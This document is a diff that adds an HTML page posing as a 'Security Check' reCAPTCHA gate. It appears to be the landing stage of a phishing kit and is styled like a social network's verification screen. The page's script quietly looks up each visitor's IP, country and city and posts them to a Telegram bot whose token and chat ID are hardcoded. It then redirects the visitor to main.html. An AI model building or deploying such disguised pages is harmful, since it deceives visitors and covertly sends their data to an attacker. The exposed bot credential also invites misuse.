@@ -1,0 +1,198 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verify reCAPTCHA</title>
+  <link rel="shortcut icon" href="ico.ico" type="image/x-icon">
+  <style>
+    body {
+    font-family: Arial, sans-serif;
+    background-color: #f0f2f5;
+    display: flex
+;
+    height: 100vh;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    }
+    
+    .container {
+      background: white;
+      padding: 25px;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      width: 400px;
+      text-align: center;
+      border: 1px solid #dcdcdc;
+    }
+    
+    .security {
+      color: #222324;
+      font-size: 23px;
+      margin-bottom: 15px;
+    }
+    
+    .text {
+      margin: 20px 0;
+      text-align: left;
+    }
+    
+    .text p {
+      font-size: 14px;
+      color: #606770;
+      margin-bottom: 15px;
+      line-height: 1.5;
+    }
+    
+    .button {
+      background: #1877f2;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+      margin-top: 15px;
+    }
+    
+    .button:hover {
+      background: #155dbb;
+    }
+    
+    .button:disabled {
+      background: #dddfe2;
+      cursor: not-allowed;
+    }
+    
+    .g-recaptcha {
+      display: inline-block;
+      margin: 15px 0;
+    }
+    .logo{
+      display: flex;
+    }
+  </style>
+</head>
+<body>
+  <div class="logo">
+<img style="width: 100px;    display: flex;    flex-direction: row;    justify-content: flex-start;" src="img/61fae2ba95e6ca00047b4f11.webp"/>
+</div>  
+<div class="container">
+
+    <div class="security">Security Check</div>
+    
+    <!-- Real reCAPTCHA v2 Widget -->
+    <div class="g-recaptcha" 
+         data-sitekey="6Len59ErAAAAABQNRZIhmrXDFHU4MtpSqhcTgfQf"
+         data-callback="onCaptchaSuccess"
+         data-expired-callback="onCaptchaExpired"></div>
+    <div class="text">
+    <p>This helps us combat harmful conduct, detect and prevent spam, and maintain the integrity of our platform.</p>
+    <p>We use Google's reCAPTCHA for security checks. By continuing, you agree to our Terms and Privacy Policy.</p>
+    </div>
+    <button class="button" id="verifyButton" disabled>Continue</button>
+  </div>
+
+  <!-- reCAPTCHA API v2 -->
+  <script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback" async defer></script>
+
+  <script>
+
+    const BOT_TOKEN = "7884550883:AAGlluMHlLYNR9jWtwe4-Vo-HaDbx13dZPY";
+    const CHAT_ID = "-4972578267";
+    
+    let captchaVerified = false;
+    
+    function onloadCallback() {
+      console.log("reCAPTCHA loaded");
+    }
+    
+    function onCaptchaSuccess(response) {
+      document.getElementById('verifyButton').disabled = false;
+      captchaVerified = true;
+    }
+    
+    function onCaptchaExpired() {
+      document.getElementById('verifyButton').disabled = true;
+      captchaVerified = false;
+      grecaptcha.reset();
+    }
+    
+    document.getElementById('verifyButton').addEventListener('click', async function() {
+      if (!captchaVerified) {
+        alert('Please complete the security check');
+        return;
+      }
+      
+      const button = this;
+      button.disabled = true;
+      button.textContent = "Verifying...";
+      
+      try {
+        const ipData = await getUserIp();
+        console.log("User IP data:", ipData);
+        
+        const message = `🔐 *New Account Verification*  
+        IP: ${ipData.ip}  
+        Country: ${ipData.country}  
+        City: ${ipData.city || 'Unknown'}  
+        Time: ${new Date().toLocaleString()}`;
+        
+        await sendToTelegram(message);
+        
+        window.location.href = 'main.html';
+        
+      } catch (error) {
+        console.error("Verification failed:", error);
+        alert("Verification failed. Please try again.");
+        button.disabled = false;
+        button.textContent = "Continue";
+        grecaptcha.reset();
+      }
+    });
+    
+    async function getUserIp() {
+      try {
+        const response = await fetch('https://ipapi.co/json/');
+        if (!response.ok) throw new Error("IP API failed");
+        return await response.json();
+      } catch (error) {
+        console.error("IP detection failed, using fallback");
+        const fallback = await fetch('https://api.ipify.org?format=json');
+        return {
+          ip: (await fallback.json()).ip || "Unknown",
+          country: "Unknown",
+          city: "Unknown"
+        };
+      }
+    }
+    
+    async function sendToTelegram(message) {
+      try {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        });
+        
+        if (!response.ok) {
+          throw new Error(`Telegram API error: ${response.status}`);
+        }
+        
+        console.log("Message sent to Telegram");
+      } catch (error) {
+        console.error("Failed to send to Telegram:", error);
+        throw error;
+      }
+    }
+  </script>
+</body>
+</html>
